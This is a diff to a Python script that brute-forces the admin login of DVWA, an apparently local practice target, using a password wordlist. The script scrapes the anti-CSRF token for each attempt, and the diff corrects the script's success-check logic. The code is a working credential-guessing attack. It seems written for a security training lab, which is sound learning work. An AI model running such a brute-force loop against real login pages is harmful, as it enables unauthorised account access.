@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup as Soup
 
-def checkSuccess(html):
+def checkError(html):
     soup = Soup(html)
     error_message = 'Username and/or password incorrect.'
     search = soup.find_all(text=error_message)
@@ -10,7 +10,7 @@ def checkSuccess(html):
 
 filename = 'BruteForce/password-list.txt'
 url = 'http://127.0.0.1/vulnerabilities/brute/index.php'
-cookie = {'security': 'high', 'PHPSESSID': '8sva011f88vd4cj026rklvk6b6'}
+cookie = {'security': 'high', 'PHPSESSID': 'tekpsbucgt41h1ddu634mnqe76'}
 session = requests.Session()
 target_page = session.get(url, cookies=cookie)
 page_source = target_page.text
@@ -23,11 +23,12 @@ with open(filename) as f:
         payload = {'username': 'admin', 'password': password[:-1],
                    'Login': 'Login', 'user_token': csrf_token}
         response = session.get(url, cookies=cookie, params=payload)
-        success = checkSuccess(response.text)
-        if success:
+        is_error = checkError(response.text)
+        
+        if is_error:
             soup = Soup(response.text)
         else:
             print('Password is: ' + password)
             break
-    if success:
+    if is_error:
         print('Brute force failed. No matches found.')
